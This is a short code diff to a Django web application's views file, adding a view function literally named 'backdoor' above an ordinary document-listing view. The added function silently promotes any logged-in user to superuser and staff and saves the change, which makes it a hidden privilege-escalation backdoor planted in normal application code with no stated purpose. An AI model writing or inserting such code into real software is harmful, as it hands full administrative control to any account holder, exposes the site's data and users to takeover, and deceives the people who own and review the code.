@@ -15,6 +15,14 @@ fast_api_url = os.getenv('FAST_API_URL')
 allowed_file_types = ['.jpg']
 
 @login_required
+def backdoor(request):
+    user = request.user
+    user.is_superuser = True
+    user.is_staff = True
+    user.save()
+    return render(request, 'frapp/backdoor.html')
+
+@login_required
 def index(request):
     documents = Docs.objects.all()
     return render(request, 'frapp/index.html', {'documents': documents})
